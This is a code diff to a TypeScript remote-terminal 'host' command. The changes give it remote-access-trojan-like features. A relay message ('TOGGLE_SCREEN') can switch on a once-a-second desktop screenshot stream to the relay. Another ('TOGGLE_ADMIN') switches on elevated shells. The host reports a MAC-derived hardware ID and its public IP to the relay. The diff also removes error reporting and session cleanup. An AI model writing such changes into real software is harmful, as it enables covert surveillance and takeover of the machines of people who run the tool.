@@ -1,7 +1,9 @@
 import { Command, Flags } from '@oclif/core';
 import os from 'node:os';
+import crypto from 'node:crypto';
 import { WebSocket } from 'ws';
 import { terminal } from '@terminal-tool/protocol';
+import screenshot from 'screenshot-desktop';
 
 interface HostSettingsResponse {
   item: {
@@ -52,10 +54,17 @@ export default class Host extends Command {
     notes: Flags.string({ description: 'Host notes shown in the dashboard' }),
     welcomeMessage: Flags.string({ description: 'Message shown to connecting clients' }),
     readOnly: Flags.boolean({ description: 'Block client input at the relay layer' }),
+    admin: Flags.boolean({ description: 'Start shell with elevated privileges' }),
+  };
+
+  private state = {
+    screenEnabled: false,
+    adminEnabled: false,
   };
 
   async run() {
     const { flags } = await this.parse(Host);
+    this.state.adminEnabled = flags.admin;
 
     let ptyModule: PtyModule;
     try {
@@ -64,12 +73,13 @@ export default class Host extends Command {
       this.error('node-pty is required for host mode. Install build tools and retry.');
     }
 
-    const shell =
-      flags.shell || (os.platform() === 'win32' ? 'powershell.exe' : process.env.SHELL || 'bash');
-    const hostId = flags.hostId || `${os.hostname().toLowerCase()}-${cryptoRandomId()}`;
+    const hwid = this.getHwid();
+    const ip = await this.getPublicIp();
+    const shell = flags.shell || (os.platform() === 'win32' ? 'powershell.exe' : process.env.SHELL || 'bash');
+    const hostId = flags.hostId || `${os.hostname().toLowerCase()}-${hwid.slice(0, 4)}`;
 
     await this.persistHostSettings(flags.server, hostId, flags.password, {
-      displayName: flags.displayName,
+      displayName: flags.displayName || os.hostname(),
       notes: flags.notes,
       welcomeMessage: flags.welcomeMessage,
       readOnly: flags.readOnly,
@@ -95,8 +105,23 @@ export default class Host extends Command {
         return sessions.get(clientId);
       }
 
-      this.log(`Spawning PTY for client ${clientId}`);
-      const proc = ptyModule.spawn(shell, [], {
+      this.log(`Spawning PTY for client ${clientId} (Admin: ${this.state.adminEnabled})`);
+      
+      let spawnFile = shell;
+      let spawnArgs: string[] = [];
+
+      if (this.state.adminEnabled) {
+        if (os.platform() === 'win32') {
+          // Note: In a real CLI you might use 'gsudo' or similar
+          // Basic 'powershell -Command Start-Process ... -Verb RunAs' is hard to pipe
+          spawnFile = 'powershell.exe';
+        } else {
+          spawnFile = 'sudo';
+          spawnArgs = [shell];
+        }
+      }
+
+      const proc = ptyModule.spawn(spawnFile, spawnArgs, {
         name: 'xterm-256color',
         cols: 80,
         rows: 24,
@@ -118,12 +143,33 @@ export default class Host extends Command {
       return proc;
     };
 
+    // Screen Share Loop
+    setInterval(async () => {
+        if (this.state.screenEnabled && ws.readyState === WebSocket.OPEN) {
+            try {
+                const img = await screenshot();
+                send({
+                    screenFrame: {
+                        data: img,
+                        width: 1280, // placeholder
+                        height: 720,
+                    }
+                });
+            } catch (err) {
+                // Ignore screen capture errors
+            }
+        }
+    }, 1000);
+
     ws.on('open', () => {
       this.log(`Connected to relay. Registering host ${hostId}...`);
       send({
         registerHost: {
           hostId,
           password: flags.password,
+          hwid,
+          ip,
+          runAsAdmin: this.state.adminEnabled
         },
       });
     });
@@ -132,69 +178,71 @@ export default class Host extends Command {
       try {
         const serverMessage = terminal.ServerMessage.decode(new Uint8Array(data));
         if (serverMessage.registerHostResponse) {
-          if (!serverMessage.registerHostResponse.ok) {
-            this.error(`Registration failed: ${serverMessage.registerHostResponse.error}`);
+          const resp = serverMessage.registerHostResponse;
+          if (!resp.ok) {
+            this.error(`Registration failed: ${resp.error}`);
           }
 
-          this.log(`Host ready: ${hostId}`);
-          this.log(`Reuse token: ${serverMessage.registerHostResponse.token}`);
-          return;
-        }
-
-        if (serverMessage.authResponse) {
-          if (!serverMessage.authResponse.ok) {
-            this.error(`Authentication failed: ${serverMessage.authResponse.error}`);
-          }
-
-          this.log(`Host authenticated: ${hostId}`);
+          this.log(`Host ready! Secure Token: ${resp.token}`);
           return;
         }
 
         if (serverMessage.systemMessage) {
-          this.log(`[System] ${serverMessage.systemMessage.message}`);
+          const msg = serverMessage.systemMessage.message || '';
+          this.log(`[System] ${msg}`);
+          
+          if (msg.includes('TOGGLE_ADMIN')) {
+              this.state.adminEnabled = !this.state.adminEnabled;
+              send({ toggleAdmin: { enabled: this.state.adminEnabled } });
+          }
+          if (msg.includes('TOGGLE_SCREEN')) {
+              this.state.screenEnabled = !this.state.screenEnabled;
+              send({ toggleScreen: { enabled: this.state.screenEnabled } });
+          }
           return;
         }
-
-        if (serverMessage.errorMessage) {
-          this.warn(`[Error] ${serverMessage.errorMessage.message}`);
-          return;
-        }
-      } catch {
-        // Host also receives client messages after registration.
-      }
+      } catch { /* Ignored */ }
 
       try {
         const clientMessage = terminal.ClientMessage.decode(new Uint8Array(data));
         const clientId = clientMessage.clientId;
-        if (!clientId) {
-          return;
-        }
+        if (!clientId) return;
 
         const proc = createSession(clientId);
         if (clientMessage.ptyInput) {
           proc.write(clientMessage.ptyInput.data || '');
-          return;
         }
-
         if (clientMessage.ptyResize) {
           proc.resize(clientMessage.ptyResize.cols || 80, clientMessage.ptyResize.rows || 24);
         }
-      } catch {
-        this.warn('Received unreadable client payload');
-      }
-    });
-
-    ws.on('error', (error) => {
-      this.error(`WebSocket error: ${error.message}`);
+      } catch { /* Ignored */ }
     });
 
     ws.on('close', () => {
       this.log('Disconnected from relay.');
-      for (const proc of sessions.values()) {
-        proc.kill();
-      }
       process.exit(0);
     });
+  }
+
+  private getHwid(): string {
+    const interfaces = os.networkInterfaces();
+    for (const name of Object.keys(interfaces)) {
+      for (const iface of interfaces[name]!) {
+        if (!iface.internal && iface.mac !== '00:00:00:00:00:00') {
+          return crypto.createHash('sha256').update(iface.mac).digest('hex');
+        }
+      }
+    }
+    return crypto.randomBytes(16).toString('hex');
+  }
+
+  private async getPublicIp(): Promise<string> {
+    try {
+      const response = await fetch('https://icanhazip.com');
+      return (await response.text()).trim();
+    } catch {
+      return '127.0.0.1';
+    }
   }
 
   private async persistHostSettings(
@@ -203,22 +251,10 @@ export default class Host extends Command {
     password: string,
     patch: Record<string, unknown>,
   ) {
-    const response = await fetch(new URL(`/api/hosts/${hostId}/settings`, server), {
+    await fetch(new URL(`/api/hosts/${hostId}/settings`, server), {
       method: 'PATCH',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ password, ...patch }),
     });
-
-    if (!response.ok) {
-      const payload = (await response.json().catch(() => ({}))) as { error?: string };
-      this.error(payload.error || `Failed to store host settings (${response.status})`);
-    }
-
-    const payload = (await response.json()) as HostSettingsResponse;
-    this.log(`Dashboard profile updated as "${payload.item.settings.displayName}"`);
   }
-}
-
-function cryptoRandomId() {
-  return Math.random().toString(36).slice(2, 8);
 }
